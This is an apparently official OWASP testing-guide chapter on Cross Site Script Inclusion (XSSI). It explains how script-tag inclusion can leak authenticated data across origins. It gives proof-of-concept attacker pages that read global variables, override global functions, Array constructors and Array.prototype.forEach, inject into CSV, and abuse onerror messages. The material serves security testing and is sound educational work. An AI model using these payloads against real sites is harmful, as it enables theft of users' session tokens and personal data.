# Testing for Cross Site Script Inclusion

|ID          |
|------------|
|WSTG-CLNT-13|

## Summary

Cross Site Script Inclusion (XSSI) vulnerability allows sensitive data leakage across-origin or cross-domain boundaries. Sensitive data could include authentication-related data (login states, cookies, auth tokens, session IDs, etc.) or user's personal or sensitive personal data (email addresses, phone numbers, credit card details, social security numbers, etc.). XSSI is a client-side attack similar to Cross Site Request Forgery (CSRF) but has a different purpose. Where CSRF uses the authenticated user context to execute certain state-changing actions inside a victim’s page (e.g. transfer money to the attacker's account, modify privileges, reset password, etc.), XSSI instead uses JavaScript on the client-side to leak sensitive data from authenticated sessions.

By default, websites are only allowed to access data if they are from the same origin. This is a key application security principle and governed by the same-origin policy (defined by [RFC 6454](https://tools.ietf.org/html/rfc6454)). An origin is defined as the combination of URI scheme (HTTP or HTTPS), host name, and port number. However, this policy is not applicable for HTML `<script>` tag inclusions. This exception is necessary, as without it websites would not be able to consume third party services, perform traffic analysis, or use advertisement platforms, etc.

When the browser opens a website with `<script>` tags, the resources are fetched from the cross-origin domain. The resources then run in the same context as the including site or browser, which presents the opportunity to leak sensitive data. In most cases, this is achieved using JavaScript, however, the script source doesn't have to be a JavaScript file with type `text/javascript` or `.js` extension.

Older browser's vulnerabilities (IE9/10) allowed data leakage via JavaScript error messages at runtime, but those vulnerabilities have now been patched by vendors and are considered less relevant. By setting the charset attribute of the `<script>` tag, an attacker or tester can enforce UTF-16 encoding, allowing data leakage for other data formats (e.g. JSON) in some cases. For more on these attacks, see [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf).

## Test Objectives

- Locate sensitive data across the system.
- Assess the leakage of sensitive data through various techniques.

## How to Test

### Collect Data Using Authenticated and Unauthenticated User Sessions

Identify which endpoints are responsible for sending sensitive data, what parameters are required, and identify all relevant dynamically and statically generated JavaScript responses using authenticated user sessions. Pay special attention to sensitive data sent using [JSONP](https://en.wikipedia.org/wiki/JSONP). To find dynamically generated JavaScript responses, generate authenticated and unauthenticated requests, then compare them. If they're different, it means the response is dynamic; otherwise it's static. To simplify this task, a tool such as [Veit Hailperin's Burp proxy plugin](https://github.com/luh2/DetectDynamicJS) can be used. Make sure to check other file types in addition to JavaScript; XSSI is not limited to JavaScript files alone.

### Determine Whether the Sensitive Data Can Be Leaked Using JavaScript

Testers should analyze code for the following vehicles for data leakage via XSSI vulnerabilities:

1. Global variables
2. Global function parameters
3. CSV (Comma Separated Values) with quotations theft
4. JavaScript runtime errors
5. Prototype chaining using `this`

### 1. Sensitive Data Leakage via Global Variables

An API key is stored in a JavaScript file with the URI `https://victim.com/internal/api.js` on the victim's website, `victim.com`, which is only accessible to authenticated users. An attacker configures a website, `attackingwebsite.com`, and uses the `<script>` tag to refer to the JavaScript file.

Here are the contents of `https://victim.com/internal/api.js`:

```javascript
(function() {
  window.secret = "supersecretUserAPIkey";
})();
```

The attack site, `attackingwebsite.com`, has an `index.html` with the following code:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global variables</title>
  </head>
  <body>
    <h1>Leaking data via global variables</h1>
    <script src="https://victim.com/internal/api.js"></script>
    <div id="result">
    </div>
    <script>
      var div = document.getElementById("result");
      div.innerHTML = "Your secret data <b>" + window.secret + "</b>";
    </script>
  </body>
</html>
```

In this example, a victim is authenticated with `victim.com`. An attacker lures the victim to `attackingwebsite.com` via social engineering, phishing emails, etc. The victim's browser then fetches `api.js`, resulting in the sensitive data being leaked via the global JavaScript variable and displayed using `innerHTML`.

### 2. Sensitive Data Leakage via Global Function Parameters

This example is similar to the previous one, except in this case `attackingwebsite.com` uses a global JavaScript function to extract the sensitive data by overwriting the victim's global JavaScript function.

Here are the contents of `https://victim.com/internal/api.js`:

```javascript
(function() {
  var secret = "supersecretAPIkey";
  window.globalFunction(secret);
})();
```

The attack site, `attackingwebsite.com`, has an `index.html` with the following code:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking data via global function parameters</title>
  </head>
  <body>
    <div id="result">
    </div>
    <script>
      function globalFunction(param) {
        var div = document.getElementById("result");
        div.innerHTML = "Your secret data: <b>" + param + "</b>";
      }
    </script>
    <script src="https://victim.com/internal/api.js"></script>
  </body>
</html>
```

There are other XSSI vulnerabilities that can result in sensitive data leakage either via JavaScript prototype chains or global function calls. For more on these attacks, see [The Unexpected Dangers of Dynamic JavaScript](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf).

### 3. Sensitive Data Leakage via CSV with Quotations Theft

To leak data the attacker/tester has to be able to inject JavaScript code into the CSV data. The following example code is an excerpt from Takeshi Terada's [Identifier based XSSI attacks](https://www.mbsd.jp/Whitepaper/xssi.pdf) whitepaper.

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: xxxx

1,"___","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"___","zzz@example.com","03-0000-0099"
```

In this example, using the `___` columns as injection points and inserting JavaScript strings in their place has the following result.

```text
1,"\"",$$$=function(){/*","aaa@a.example","03-0000-0001"
2,"foo","bbb@b.example","03-0000-0002"
...
98,"bar","yyy@example.net","03-0000-0088"
99,"*/}//","zzz@example.com","03-0000-0099"
```

[Jeremiah Grossman wrote about a similar vulnerability in Gmail](https://blog.jeremiahgrossman.com/2006/01/advanced-web-attack-techniques-using.html) in 2006 that allowed the extraction of user contacts in JSON. In this case, the data was received from Gmail and parsed by the browser JavaScript engine using an unreferenced Array constructor to leak the data. An attacker could access this Array with the sensitive data by defining and overwriting the internal Array constructor like this:

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Leaking gmail contacts via JSON </title>
  </head>
  <body>
    <script>
      function Array() {
        // steal data
      }
    </script>
    <script src="http://mail.google.com/mail/?_url_scrubbed_"></script>
  </body>
</html>
```

### 4. Sensitive Data Leakage via JavaScript Runtime Errors

Browsers normally present standardized [JavaScript error messages](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Errors). However, in the case of IE9/10, runtime error messages provided additional details that could be used to leak data. For example, a website `victim.com` serves the following content at the URI `http://victim.com/service/csvendpoint` for authenticated users:

```text
HTTP/1.1 200 OK
Content-Type: text/csv
Content-Disposition: attachment; filename="a.csv"
Content-Length: 13

1,abc,def,ghi
```

This vulnerability could be exploited with the following:

```html
<!--error handler -->
<script>window.onerror = function(err) {alert(err)}</script>
<!--load target CSV -->
<script src="http://victim.com/service/csvendpoint"></script>
```

When the browser tries to render the CSV content as JavaScript, it fails and leaks the sensitive data:

![JavaScript runtime error message ](images/XSSI1.jpeg)\
*Figure 4.11.13-1: JavaScript runtime error message*

### 5. Sensitive Data Leakage via Prototype Chaining Using `this`

In JavaScript, the `this` keyword is dynamically scoped. This means if a function is called upon an object, `this` will point to this object even though the called function might not belong to the object itself. This behavior can be used to leak data. In the following example from [Sebastian Leike's demonstration page](http://sebastian-lekies.de/leak/), the sensitive data is stored in an Array. An attacker can override `Array.prototype.forEach` with an attacker-controlled function. If some code calls the `forEach` function on an array instance that contains sensitive values, the attacker-controlled function will be invoked with `this` pointing to the object that contains the sensitive data.

Here is an excerpt of a JavaScript file containing sensitive data, `javascript.js`:

```javascript
...
(function() {
  var secret = ["578a8c7c0d8f34f5", "345a8b7c9d8e34f5"];

  secret.forEach(function(element) {
    // do something here
  });  
})();
...
```

The sensitive data can be leaked with the following JavaScript code:

```html
...
 <div id="result">

    </div>
    <script>
      Array.prototype.forEach = function(callback) {
        var resultString = "Your secret values are: <b>";
        for (var i = 0, length = this.length; i < length; i++) {
          if (i > 0) {
            resultString += ", ";
          }
          resultString += this[i];
        }
        resultString += "</b>";
        var div = document.getElementById("result");
        div.innerHTML = resultString;
      };
    </script>
    <script src="http://victim.com/..../javascript.js"></script>
...
```
